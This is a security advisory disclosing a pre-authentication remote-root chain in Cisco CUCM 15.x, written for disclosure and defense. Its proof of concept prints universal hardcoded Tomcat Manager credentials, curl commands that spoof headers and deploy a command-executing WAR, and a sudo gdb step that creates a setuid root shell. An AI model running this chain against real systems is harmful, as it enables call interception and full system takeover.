# Silent;Call — Pre-Authentication Remote Root in Cisco CUCM 15.x

## Advisory Information

- **Advisory ID:** SKYLINE-2026-001
- **Drop Name:** Silent;Call
- **Title:** Pre-Authentication Remote Root via Tomcat Manager Header Injection + Hardcoded Credentials in Cisco CUCM 15.x
- **Components:** Spoofhack (SKYLINE-2026-001) → Keyhack (SKYLINE-2026-002) → Roothack (SKYLINE-2026-003)
- **CVSSv3.1 Score:** 10.0 (Critical)
- **CVSSv3.1 Vector:** AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
- **CWE:** CWE-798 (Hard-Coded Credentials), CWE-644 (Improper Neutralization of HTTP Headers), CWE-269 (Improper Privilege Management)
- **Affected Product:** Cisco Unified Communications Manager (CUCM) 15.0.1.12900-234
- **Other Versions Likely Affected:** All CUCM 15.x and potentially 14.x/12.5.x (same Tomcat + HAProxy architecture)
- **Vendor:** Cisco Systems, Inc.
- **Vendor Coordination:** 17 CUCM submissions pending at ZDI; SSD paused CUCM acquisitions. No CVE IDs assigned through vendor CNA or third-party channels.
- **Public Disclosure:** 2026-08-04
- **Researcher:** 0xReadingSteiner (0xReadingSteiner@proton.me)
- **Advisory Number:** 1 of 55 identified vulnerabilities in CUCM 15.x

---

## Executive Summary

A pre-authentication remote code execution vulnerability chain in Cisco Unified Communications Manager 15.x allows an unauthenticated attacker on the network to achieve root-level access to the underlying operating system. The attack requires three HTTP requests and no user interaction.

The chain exploits three independent flaws:

1. **Tomcat RemoteIpValve misconfiguration** — accepts `X-Forwarded-For` from any source without `internalProxies` restriction, allowing an attacker to spoof their IP as `127.0.0.1`
2. **Hardcoded Tomcat Manager credentials** — the same username and password (`1mJdd4WKi+` / `1ge1AVWsx~`) are present on every CUCM 15.x installation, granting WAR deployment capability
3. **Unrestricted sudo for the `tomcat` user** — `gdb` with an attacker-controlled command file can be executed as root without a password

Combined, these allow an unauthenticated network attacker to deploy a malicious WAR file and escalate to root in under 30 seconds.

**This vulnerability was confirmed live against a fresh installation of CUCM 15.0.1.12900-234 on July 30-31, 2026.**

---

## Impact

Cisco Unified Communications Manager is the call-processing core of Cisco's enterprise voice platform. It is deployed in Fortune 500 companies, US federal agencies, the Department of Defense, hospitals, financial institutions, law enforcement agencies, and telecommunications providers worldwide.

Root access to CUCM grants an attacker the ability to:

- **Intercept all voice communications** — CUCM manages SRTP key distribution. Root access provides the encryption keys, enabling real-time decryption and recording of all "encrypted" calls across the organization.
- **Activate lawful intercept capabilities** — CUCM includes built-in CALEA-compliant wiretapping features. An attacker with root access can enable these silently to mirror call audio to an external endpoint.
- **Access all voicemail** — stored voicemail, including messages marked confidential, is accessible from the underlying filesystem and database.
- **Manipulate call routing** — calls can be redirected, forwarded, or routed through attacker-controlled media proxies for interception without the caller or callee's knowledge.
- **Disable emergency services** — CUCM manages E911 routing. An attacker can disable or redirect emergency calls.
- **Exfiltrate call records** — complete CDR (Call Detail Records) revealing who called whom, when, and for how long across the entire organization.
- **Pivot to additional infrastructure** — CUCM sits on the voice VLAN with direct connectivity to IP phones, voice gateways, SBCs, PSTN trunks, and other UC components.

### Comparison to Salt Typhoon

In 2024-2025, the Chinese state-sponsored group Salt Typhoon compromised US telecommunications carrier infrastructure to wiretap targeted individuals. The Expressway-to-CUCM attack chain provides equivalent wiretapping capability at the enterprise level. The critical difference: carrier infrastructure is defended by dedicated security operations centers. Enterprise CUCM deployments — running in hospitals, government agencies, and businesses — typically have no dedicated voice security monitoring. The admin interface is often reachable from the internal network without additional access controls.

---

## Technical Details

### Architecture Background

CUCM 15.x runs on AlmaLinux 8. External requests arrive through HAProxy (ports 443, 8443), which forwards them to a Tomcat 9.0.88 instance running on port 81. HAProxy adds `X-Forwarded-For` headers and uses the PROXY protocol for backend connections.

```
Internet/LAN → HAProxy (:443/:8443) → Tomcat (:81) → Application
```

### Spoofhack — X-Forwarded-For Trust Without Restriction

**File:** `server.xml` (Tomcat configuration)

Tomcat is configured with `RemoteIpValve` to process forwarded headers:

```xml
<Valve className="org.apache.catalina.valves.RemoteIpValve"
       remoteIpHeader="x-forwarded-for"/>
```

The critical omission: **no `internalProxies` attribute is set.** When `internalProxies` is absent, `RemoteIpValve` accepts `X-Forwarded-For` from ANY connecting IP and uses it to overwrite `request.getRemoteAddr()`.

HAProxy connects to Tomcat from `127.0.0.1` (same host) and passes through the client-supplied `X-Forwarded-For` header without stripping it. An attacker who sends:

```
X-Forwarded-For: 127.0.0.1
```

causes `RemoteIpValve` to set `request.getRemoteAddr()` to `127.0.0.1`, making the request appear to originate from localhost.

### Keyhack — Hardcoded Tomcat Manager Credentials

**File:** `tomcat-users.xml`

The Tomcat Manager application is deployed and accessible. Access is restricted by `RemoteAddrValve` to `127.0.0.1`:

```xml
<!-- manager/META-INF/context.xml -->
<Valve className="org.apache.catalina.valves.RemoteAddrValve"
       allow="127.0.0.1"/>
```

This restriction is bypassed by Vulnerability 1 (X-Forwarded-For spoofing).

The Manager credentials are hardcoded in `tomcat-users.xml` and are **identical across all CUCM 15.x installations:**

```xml
<user username="1mJdd4WKi+" password="1ge1AVWsx~"
      roles="manager-gui,manager-script,admin-gui,admin-script"/>
```

These credentials are not configurable by the CUCM administrator. They are baked into the product.

With the `manager-script` role, an attacker can deploy arbitrary WAR files via the Manager text interface, achieving Remote Code Execution as the `tomcat` user.

### Roothack — Sudo Privilege Escalation via GDB

**File:** `/etc/sudoers`

The `tomcat` user has passwordless sudo access to `gdb` with an attacker-controlled command file:

```
tomcat ALL=(root) NOPASSWD: /usr/bin/gdb -pid * --command=/tmp/gdb_file
```

The file `/tmp/gdb_file` is in a world-writable directory. An attacker writes a GDB command script containing:

```
shell <arbitrary command>
detach
quit
```

GDB's `shell` command executes operating system commands as the process owner — which via `sudo` is root.

---

## Proof of Concept

### Step 1: Access Tomcat Manager (Pre-Auth)

```bash
# Without X-Forwarded-For: HTTP 403
curl -sk -u '1mJdd4WKi+:1ge1AVWsx~' \
  "https://TARGET:443/manager/text/list"

# With X-Forwarded-For: HTTP 200, full application listing
curl -sk -H "X-Forwarded-For: 127.0.0.1" \
  -u '1mJdd4WKi+:1ge1AVWsx~' \
  "https://TARGET:443/manager/text/list"
```

Expected output: `OK - Listed applications for virtual host [localhost]` followed by a list of ~45 deployed applications.

### Step 2: Deploy WAR (RCE as tomcat)

```bash
# Create minimal WAR that executes 'id'
mkdir -p /tmp/poc && cat > /tmp/poc/index.jsp << 'JSP'
<%
Runtime rt = Runtime.getRuntime();
Process p = rt.exec(new String[]{"/bin/sh","-c","id"});
java.io.InputStream is = p.getInputStream();
int c; while ((c = is.read()) != -1) out.write(c);
%>
JSP
cd /tmp/poc && jar cf /tmp/poc.war index.jsp

# Deploy
curl -sk -H "X-Forwarded-For: 127.0.0.1" \
  -u '1mJdd4WKi+:1ge1AVWsx~' \
  -T /tmp/poc.war \
  "https://TARGET:443/manager/text/deploy?path=/poc&update=true"
```

Expected output: `OK - Deployed application at context path [/poc]`

### Step 3: Escalate to Root

From the deployed webapp context (via the JSP):

```bash
# Write GDB command file
echo -e "shell cp /bin/bash /tmp/rootbash\nshell chmod 4755 /tmp/rootbash\ndetach\nquit" > /tmp/gdb_file

# Execute as root (attaches to PID 1, runs commands, detaches)
sudo -n /usr/bin/gdb -pid 1 --command=/tmp/gdb_file

# Verify
/tmp/rootbash -p -c "id"
# Output: uid=502(tomcat) gid=502(tomcat) euid=0(root)
```

### Confirmed Results

Tested on CUCM 15.0.1.12900-234, fresh installation, July 30-31 2026:

- WAR deployment: **Successful** (HTTP 200, application accessible)
- Code execution as `tomcat`: **Confirmed** (`uid=502(tomcat)`)
- Root escalation via GDB: **Confirmed** (`uid=0(root)`)
- `/etc/shadow` extraction: **Confirmed** as proof of root access
- SELinux context: `system_u:system_r:tomcatd_t:s0` — GDB bypass works within this context

---

## Additional Privilege Escalation Paths

The GDB method is one of three independent root escalation paths available to the `tomcat` user:

### Path 2: Unrestricted systemctl (5 users)

```
tomcat ALL=(root) NOPASSWD: /usr/bin/systemctl
```

The `tomcat`, `database`, `ccmservice`, `ctftp`, and `admin` users can run any `systemctl` subcommand as root. A malicious `.service` file achieves arbitrary command execution as root.

### Path 3: PYTHONPATH Hijack

```
Defaults env_keep += "PYTHONPATH"
```

Combined with sudo access to Python scripts, an attacker injects a malicious module via `PYTHONPATH=/tmp` to achieve root code execution.

### Path 4: LD_PRELOAD Injection

`LD_LIBRARY_PATH` and `LD_PRELOAD` are preserved in the sudo environment (`env_keep`), allowing shared library injection into any sudo'd binary.

---

## Root Cause Analysis

The fundamental root cause is a layered trust assumption failure:

1. **Cisco assumes HAProxy is the only source of `X-Forwarded-For` headers.** It is not — HAProxy appends the real client IP but does not strip client-supplied values. Tomcat's `RemoteIpValve` reads the first value (attacker-controlled), not the last (HAProxy-appended).

2. **Cisco assumes the Tomcat Manager is unreachable from the network.** It is reachable — the `RemoteAddrValve` restriction is bypassed by the header injection above.

3. **Cisco hardcodes Manager credentials and provides no mechanism for administrators to change them.** The credentials are identical on every installation, making them a universal skeleton key.

4. **Cisco grants the `tomcat` service account unrestricted sudo access** to `gdb`, `systemctl`, and preserves dangerous environment variables (`PYTHONPATH`, `LD_*`) — providing four independent paths from service account to root.

Each flaw individually is serious. Combined, they produce a pre-authentication remote root chain requiring three HTTP requests and zero user interaction.

---

## Affected Components

| Component | Version |
|-----------|---------|
| Cisco CUCM | 15.0.1.12900-234 |
| Apache Tomcat | 9.0.88 |
| OpenJDK | 1.8.0_362 |
| HAProxy | CUCM-bundled |
| AlmaLinux | 8 |

---

## Remediation

Cisco has not released a patch for these vulnerabilities. Until a patch is available, organizations should:

1. **Restrict network access to CUCM** — CUCM should not be accessible from general-purpose networks. Place it behind firewalls with strict ACLs limiting access to voice VLANs and authorized management stations only.
2. **Monitor for WAR deployments** — Alert on new applications appearing in the Tomcat Manager application list.
3. **Audit sudoers** — Review `/etc/sudoers` for unrestricted entries and remove or restrict them. Note: modifying sudoers on CUCM may break Cisco support and cluster operations.
4. **Monitor HAProxy logs** — Alert on requests containing `X-Forwarded-For: 127.0.0.1` from external sources.

---

## Vendor Coordination Timeline

| Date | Action |
|------|--------|
| 2026 | 17 CUCM vulnerabilities submitted to ZDI (Zero Day Initiative); ZDI coordinates with Cisco on the researcher's behalf — submissions remain unprocessed |
| 2026 | SSD (Security Solutions & Development) paused CUCM acquisitions, stating: "not accepting any more CUCM vulnerabilities until Cisco has addressed other submissions" |
| 2026-08-04 | Cisco PSIRT contacted directly via psirt@cisco.com |
| 2026-08-04 | CVE IDs requested from MITRE (CNA of Last Resort) |
| 2026-08-04 | Public disclosure |

---

## Disclosure Statement

This advisory is one of 55 vulnerabilities identified in Cisco CUCM 15.x through independent security research conducted on commercially available software in a private laboratory environment. No proprietary source code, internal tools, or confidential information was used in this research.

The researcher attempted to coordinate with Cisco through standard channels. Cisco declined to review the findings. Two independent vulnerability brokers (ZDI and SSD) have been unable to process CUCM submissions due to Cisco's failure to address existing reports in their queues.

Additional findings will be published on a rolling basis.

---

## About

This research was conducted independently. The researcher is available for coordination with Cisco PSIRT, CERT/CC, CISA, or any affected organization seeking to understand their exposure.

Contact: 0xReadingSteiner@proton.me

---

## References

- Cisco CUCM Product Page: https://www.cisco.com/c/en/us/products/unified-communications/unified-communications-manager-callmanager/index.html
- Apache Tomcat RemoteIpValve Documentation: https://tomcat.apache.org/tomcat-9.0-doc/api/org/apache/catalina/valves/RemoteIpValve.html
- CWE-798: Use of Hard-Coded Credentials: https://cwe.mitre.org/data/definitions/798.html
- Salt Typhoon Campaign (2024-2025): US telecommunications infrastructure wiretapping via state-sponsored compromise
